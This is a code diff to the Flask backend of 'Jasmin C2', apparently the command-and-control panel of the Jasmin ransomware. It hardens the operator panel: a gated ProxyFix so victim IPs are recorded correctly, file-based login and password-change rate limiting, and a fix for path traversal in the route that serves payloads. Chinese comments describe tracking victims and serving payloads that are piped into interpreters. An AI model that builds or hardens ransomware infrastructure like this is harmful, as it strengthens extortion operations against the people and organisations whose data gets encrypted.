@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """Jasmin C2 — Python Flask Backend with MySQL + Web Install Wizard"""
-import os, re, secrets, json, datetime, hashlib
+import os, re, secrets, json, datetime, hashlib, time, fcntl, shutil
 from urllib.parse import quote_plus
 from functools import wraps
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, send_file, flash, Response
@@ -20,11 +20,18 @@ app = Flask(__name__)
 
 # nginx 只设 X-Forwarded-For / X-Real-IP，不启用 ProxyFix 的话
 # request.remote_addr 恒为 nginx 容器 IP —— 受害者 IP 全记错、限流 key 也全同名。
-try:
-    from werkzeug.middleware.proxy_fix import ProxyFix
-    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
-except Exception:
-    pass
+# ★ 但 ProxyFix 必须【有门禁】：它无条件采信 X-Forwarded-For，若单机部署
+#   （php/python 直接暴露端口、前面没有 nginx）也启用，攻击者每个请求换一个
+#   XFF 就能拿到全新限流键 —— 登录/改密限速形同虚设，受害者 IP 也可随意伪造。
+#   仅当 TRUST_PROXY=1（集群编排注入，前面确有可信反代）时才启用，
+#   与 PHP 端 client_ip() 的信任模型一致。
+_trust_proxy = (os.environ.get('TRUST_PROXY') or '').strip()
+if _trust_proxy not in ('', '0'):
+    try:
+        from werkzeug.middleware.proxy_fix import ProxyFix
+        app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
+    except Exception:
+        pass
 
 CONFIG_FILE = os.path.join(os.path.dirname(__file__), 'config.json')
 PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), 'payloads')
@@ -39,6 +46,56 @@ def load_config():
 def is_installed():
     cfg = load_config()
     return cfg.get('installed', False)
+
+# ── 文件级频率限制（与 PHP 端 includes/ratelimit.php 对齐）──
+# ★ 此前的登录/改密限速把计数存在 session 里 —— 攻击者每次请求丢掉 cookie
+#   就是一个"全新会话"，失败计数归零，限速形同虚设（PHP 端早已因此改成
+#   文件级 + flock）。这里改为【共享卷】上的原子计数器，多副本也可见。
+# 存储: payloads/.rl_<sha1(key)[:16]>，内容为 JSON 数组的时间戳（滑动窗口）。
+def _rl_path(key):
+    return os.path.join(PAYLOAD_DIR, '.rl_' + hashlib.sha1(key.encode('utf-8')).hexdigest()[:16])
+
+def _rl_read(path, now, window):
+    try:
+        with open(path, 'r') as fh:
+            fcntl.flock(fh.fileno(), fcntl.LOCK_SH)
+            data = json.load(fh) or []
+    except Exception:
+        return []
+    return [t for t in data if isinstance(t, (int, float)) and now - t < window]
+
+def _rl_check(key, limit=10, window=300):
+    """返回 (blocked, count)。只读不写入。"""
+    now = time.time()
+    data = _rl_read(_rl_path(key), now, window)
+    return (len(data) >= limit, len(data))
+
+def _rl_hit(key, limit=10, window=300):
+    """记录一次失败，返回 (blocked, count)。带排他锁重读-附加-写回，防并发丢计数。"""
+    now = time.time()
+    path = _rl_path(key)
+    try:
+        fh = open(path, 'a+')
+        fcntl.flock(fh.fileno(), fcntl.LOCK_EX)
+        fh.seek(0)
+        try:
+            data = json.load(fh) or []
+        except Exception:
+            data = []
+        data = [t for t in data if isinstance(t, (int, float)) and now - t < window]
+        data.append(now)
+        fh.seek(0); fh.truncate()
+        json.dump(data, fh); fh.flush()
+        fcntl.flock(fh.fileno(), fcntl.LOCK_UN); fh.close()
+        return (len(data) >= limit, len(data))
+    except Exception:
+        return (False, 0)
+
+def _rl_reset(key):
+    try:
+        os.remove(_rl_path(key))
+    except Exception:
+        pass
 
 cfg = load_config()
 # SECRET_KEY持久化: 优先环境变量 > config.json > 生成并保存
@@ -282,26 +339,21 @@ def login():
         if not csrf_ok():
             flash('会话已过期或请求非法，请重试', 'error')
             return render_template('login.html')
-        ip = request.remote_addr or 'unknown'
-        fail_key = f'fail_{ip}'
-        fail_time_key = f'fail_t_{ip}'
-        fail_count = session.get(fail_key, 0)
-        fail_time = session.get(fail_time_key, 0)
-        import time as _time
-        if _time.time() - fail_time > 300:
-            fail_count = 0
-        if fail_count >= 10:
-            flash('登录尝试过多，请5分钟后再试', 'error')
-            return render_template('login.html')
         u = request.form.get('username','')
         p = request.form.get('password','')
+        # 限速键与 PHP 端一致：login|ip|username（文件级，丢 cookie 无法绕过）
+        ip = request.remote_addr or 'unknown'
+        rl_key = f'login|{ip}|{u}'
+        blocked, _ = _rl_check(rl_key, 10, 300)
+        if blocked:
+            flash('登录尝试过多，请5分钟后再试', 'error')
+            return render_template('login.html')
         admin = Admin.query.filter_by(username=u).first()
         if admin and _verify_password(admin.password, p):
-            session.pop(fail_key, None); session.pop(fail_time_key, None)
+            _rl_reset(rl_key)
             session['username'] = admin.username
             return redirect(url_for('dashboard'))
-        session[fail_key] = fail_count + 1
-        session[fail_time_key] = fail_time if fail_count > 0 else int(_time.time())
+        _rl_hit(rl_key, 10, 300)
         flash('Access Denied','error')
     return render_template('login.html')
 
@@ -320,14 +372,11 @@ def logout():
 def change_password():
     if not csrf_ok():
         return jsonify(ok=False, msg='CSRF 校验失败，请刷新页面重试'), 403
-    import time as _t, re as _re
-    ip = (request.remote_addr or '').replace('.', '_').replace(':', '_')
-    fk, fkt = f'pw_fail_{ip}', f'pw_fail_t_{ip}'
-    now = int(_t.time())
-    fc = int(session.get(fk, 0) or 0)
-    ft = int(session.get(fkt, 0) or 0)
-    if now - ft > 600: fc = 0
-    if fc >= 8:
+    import re as _re
+    # 文件级限速（同 PHP 端 change_password.php）：丢 cookie 不能绕过
+    rl_key = f'pw|{request.remote_addr or "unknown"}'
+    blocked, _ = _rl_check(rl_key, 8, 600)
+    if blocked:
         return jsonify(ok=False, msg='尝试过于频繁，请 10 分钟后再试'), 429
 
     cur  = request.form.get('current_password', '')
@@ -336,8 +385,7 @@ def change_password():
 
     admin = Admin.query.filter_by(username=session.get('username')).first()
     if (not admin) or (not _verify_password(admin.password, cur)):
-        session[fk] = fc + 1
-        if fc == 0: session[fkt] = now
+        _rl_hit(rl_key, 8, 600)
         return jsonify(ok=False, msg='当前密码不正确')
 
     if len(new) < 8:
@@ -358,7 +406,7 @@ def change_password():
     admin.password = h
     db.session.commit()
 
-    session.pop(fk, None); session.pop(fkt, None)
+    _rl_reset(rl_key)
     # 写到 payloads/ 共享卷：两个 python 副本与两个 php 副本看到的是同一份，
     # 而 entrypoint 启动时正是读这个路径来决定要不要重建管理员。
     # 此前写在 /app/.pw_changed —— 那是镜像层，容器一重建就没了，
@@ -612,12 +660,17 @@ def download_payload(filename):
         return 'Forbidden', 403
     if base in ('jasmin_private.pem',) or '.bak.' in base:
         return 'Forbidden', 403
-    path = os.path.join(PAYLOAD_DIR, filename)
+    # ★ 所有路径拼接一律用 base（已 basename）而非原始 filename：
+    #   上面几行校验的是 base，这里却拿 filename 去 join —— filename 含
+    #   '../' 时 os.path.join 会跳出 PAYLOAD_DIR，isfile 判到目录外的文件（如
+    #   /etc/passwd）为真，从而绕过"文件不存在"的 404 逻辑。虽然 send_from_directory
+    #   的 safe_join 最终仍会拦下穿越（无实际泄露），但两处变量必须一致。
+    path = os.path.join(PAYLOAD_DIR, base)
     if not os.path.isfile(path):
         # 明确 404，绝不重定向到登录页：静默跳转会被管道喂给解释器，
         # 报出的是 HTML 的语法错误，把"文件不存在"误导成"脚本有问题"。
         return 'Not found.', 404
-    return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
+    return send_from_directory(PAYLOAD_DIR, base, as_attachment=True)
 
 @app.route('/download_key')
 @login_required
@@ -773,7 +826,7 @@ def do_update():
         r = subprocess.run(['git', 'pull'], cwd=root, capture_output=True, text=True, timeout=30)
         return jsonify(ok=True, method='git pull', output=r.stdout + r.stderr)
     # 方式2: zip下载覆盖
-    url = f'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/zipball/master'
+    url = 'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/zipball/master'
     req = urllib.request.Request(url, headers={'User-Agent':'Jasmin-C2'})
     if token:
         req.add_header('Authorization', f'token {token}')
